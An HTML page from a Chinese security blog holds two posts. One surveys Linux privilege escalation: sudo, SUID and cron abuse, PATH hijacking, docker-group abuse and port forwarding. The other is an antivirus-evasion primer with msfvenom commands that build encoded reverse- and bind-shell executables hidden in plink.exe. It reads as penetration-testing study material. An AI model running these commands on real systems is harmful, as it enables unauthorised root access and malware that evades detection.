<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://shu1l.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="article:author" content="Shu1L">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://shu1l.github.io/"/>





  <title>Hexo</title>
  








<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-jie-yi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/29/linux-ti-quan-zong-jie-yi/" itemprop="url">linux提权总结(一)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-29T14:01:42+08:00">
                2020-04-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/29/linux-ti-quan-zong-shu/" itemprop="url">linux提权综述</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-29T14:01:07+08:00">
                2020-04-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
<p>，要判断我们应该先对系统相关的信息进行收集。</p>
<h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul>
<li>已经拿到低权限shell</li>
<li>目标系统上有gcc</li>
<li>有上传文件的权限</li>
</ul>
<p><strong>使用命令</strong>：</p>
<pre><code>uname -a  或  uname -r</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p>
<p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p>
<p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p>
<p>这里在推荐一个很好用的工具</p>
<h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
<p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
<p>举个例子：</p>
<pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 3.0.0

Kernel local: 3.0.0

Possible Exploits:
[+] semtex
   CVE-2013-2094
   Source: www.exploit-db.com/download/25444/‎
[+] memodipper
   CVE-2012-0056
   Source: http://www.exploit-db.com/exploits/18411/
[+] perf_swevent
   CVE-2013-2094
   Source: http://www.exploit-db.com/download/26131</code></pre><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul>
<li>找到具备利用条件的exp</li>
<li>上传源代码</li>
<li>编译exp后执行</li>
</ul>
<h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><pre><code>漏洞描述：
漏洞编号：CVE-2016-5195
漏洞名称：脏牛（Dirty COW）
漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权
影响范围：Linux kernel &gt;=2.6.22 并且Android也受影响</code></pre><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
<p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p>
<p>passwd 文件：</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
<p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p>
<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p>
<pre><code>ls -l /etc/passwd /etc/shadow</code></pre><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul>
<li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li>
<li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li>
</ul>
<h4 id="4、sudo-滥用"><a href="#4、sudo-滥用" class="headerlink" title="4、sudo 滥用"></a><strong>4、sudo 滥用</strong></h4><p>sudo 大家经常遇到，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
<p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p>
<p><code>sudo -l</code></p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p>
<p>可以支持所有命令，下面参考这个网址:</p>
<blockquote>
<p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
</blockquote>
<p>这里以 awk、man 举例</p>
<p><strong>1、su</strong></p>
<blockquote>
<p>sudo su</p>
</blockquote>
<p>输入普通权限用户密码，切换为 root</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p>
<p><strong>2、awk</strong></p>
<blockquote>
<p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p>
</blockquote>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p>
<p><strong>3、man</strong></p>
<blockquote>
<p>sudo man man</p>
</blockquote>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p>
<blockquote>
</blockquote>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote>
<p>ls -l /etc/cron*</p>
</blockquote>
<p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p>
<p><strong>重写 python</strong></p>
<p>若这些计划任务的脚本可写，则编辑为 shell</p>
<p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p>
<p>测试：</p>
<blockquote>
<p>cat /etc/crontab</p>
</blockquote>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p>
<p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p>
<blockquote>
<p>ls -al /tmp/1.py //查看是否有w权限 </p>
<p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p>
</blockquote>
<p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p>
<p>原本是没有 /tmp/sh</p>
<p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p>
<p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p>
<p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p>
<p><strong>防范：</strong> </p>
<p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>
<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p>
<p>​    suid提权：</p>
<p>​    利用拥有suid的文件执行命令，从而提升权限至root</p>
<h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p>
<ul>
<li>Nmap</li>
<li>Vim</li>
<li>find</li>
<li>Bash</li>
<li>More</li>
<li>Less</li>
<li>Nano</li>
<li>cp</li>
</ul>
<p>查找系统上运行的所有SUID可执行文件：</p>
<pre><code>1. find / -user root -perm -4000 -print 2&gt;/dev/null
2. find / -perm -u=s -type f 2&gt;/dev/null
3. find / -user root -perm -4000 -exec ls -ldb {} \;</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p>
<h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
<p>交互模式可以通过执行Nmap参数” interactive “</p>
<pre><code>nmap --interactive</code></pre><p>以下命令将提供一个提升的shell。</p>
<pre><code>nmap&gt; !sh
sh-3.2# whoami
root</code></pre><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p>
<pre><code>exploit/unix/local/setuid_nmap</code></pre><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
<pre><code>touch pentestlab
find pentestlab -exec whoami \;</code></pre><pre><code>touch getflag
find / -type f -name getflag -exec &quot;whoami&quot; \;
find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</code></pre><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p>
<pre><code>vim.tiny /etc/shadow</code></pre><pre><code>vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell</code></pre><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p>
<pre><code>bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(serv</code></pre><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p>
<pre><code>less /etc/passwd
!/bin/sh</code></pre><h4 id="8、环境变量劫持-SUID-扩展"><a href="#8、环境变量劫持-SUID-扩展" class="headerlink" title="8、环境变量劫持-SUID 扩展"></a><strong>8、环境变量劫持-SUID 扩展</strong></h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
<p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p>
<p><strong>测试：</strong></p>
<p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p>
<pre class=" language-javascript"><code class="language-javascript">    cat <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>ls <span class="token operator">&lt;</span><span class="token operator">&lt;</span>EOF  
    #<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python  
    print <span class="token string">"this is not the true cat"</span>  
    print <span class="token string">"here is a root shell!"</span>  
    <span class="token keyword">import</span> pty<span class="token punctuation">;</span>pty<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>  
    EOF</code></pre>
<p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p>
<h4 id="10、docker-组提权"><a href="#10、docker-组提权" class="headerlink" title="10、docker 组提权"></a><strong>10、docker 组提权</strong></h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p>
<p>可以参考我的这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p>
<h4 id="11、服务漏洞"><a href="#11、服务漏洞" class="headerlink" title="11、服务漏洞"></a><strong>11、服务漏洞</strong></h4><blockquote>
<p>netstat -antup #查看各种网络服务 </p>
</blockquote>
<p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p>
<p><strong>1、redis 反弹 shell</strong></p>
<p>nc 单向转发</p>
<blockquote>
<p>nc -l 12345 | nc 192.168.191.170 80</p>
</blockquote>
<p>双向转发</p>
<blockquote>
<p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p>
</blockquote>
<p>双向转发本人测试失败，希望大佬们提供解决的办法</p>
<p>socat</p>
<p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p>
<blockquote>
<p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p>
</blockquote>
<p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p>
<blockquote>
<p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/" itemprop="url">重定向技术</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T21:20:28+08:00">
                2020-04-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/" itemprop="url">渗透测试之免杀入门</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T21:18:46+08:00">
                2020-04-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul>
<li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li>
<li>在用户非自愿的情况下执行安装<ul>
<li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li>
</ul>
</li>
</ul>
<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul>
<li>恶意程序最主要的防护手段<ul>
<li>杀毒软件/防病毒软件</li>
<li>客户端/服务器/邮件防病毒</li>
</ul>
</li>
<li>检测原理<ul>
<li>基于二进制文件中特征签名的黑名单检测方法</li>
<li>基于行为的分析方法（启发式）</li>
</ul>
</li>
<li>事后手段<ul>
<li>永远落后于病毒发展</li>
</ul>
</li>
</ul>
<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul>
<li>修改二进制文件中的特征字符<ul>
<li>替换、擦除、修改</li>
</ul>
</li>
<li>加密技术（crypter）<ul>
<li>通过加密是的特征字符不可读，从而逃避AV 检测</li>
<li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li>
</ul>
</li>
<li>防病毒软件的检测<ul>
<li>恶意程序本身的特征字符</li>
<li>加密器 cripter 的特征字符</li>
</ul>
</li>
</ul>
<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul>
<li>恶意软件制造者<ul>
<li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li>
<li>使用独有 crypter 软件加密恶意程序</li>
<li>处事低调，尽量避免被发现</li>
<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
<li>Fully UnDetectable 还最高追求 （FUD）</li>
</ul>
</li>
<li>AV 厂商<ul>
<li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li>
<li>一般新的恶意软件安全 UD 窗口期是一周左右</li>
<li>乐毅软件制造者永无休止的拉锯战</li>
<li>信的启发式检测技术尚有待完善(误杀漏杀)</li>
</ul>
</li>
<li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul>
<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
<li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li>
</ul>
</li>
<li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li>
<li>在线多引擎查杀网站与 AV 查杀共享信息</li>
<li>搞黑的在线多引擎查毒站<ul>
<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
<li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li>
</ul>
</li>
<li>常用的 RAT 软件<ul>
<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul>
<li>生成反弹 shell</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><ul>
<li>加密编码反弹 shell</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.132 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o b.exe</code></pre><ul>
<li>比较编码前后的检测率<ul>
<li>未经过编码的 a.exe 检测率是 45%</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174114743.png" alt="在这里插入图片描述"></p>
<h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul>
<li>利用模板隐藏 shell</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o c.exe</code></pre><ul>
<li>多重编码</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; d.exe</code></pre><ul>
<li><p>比较编码前后的检测率</p>
<ul>
<li>未经过编码的 c.exe 检测率是 40%</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174123784.png" alt="在这里插入图片描述"></p>
<ul>
<li>经过编码的 d.exe 检测率是 30%</li>
</ul>
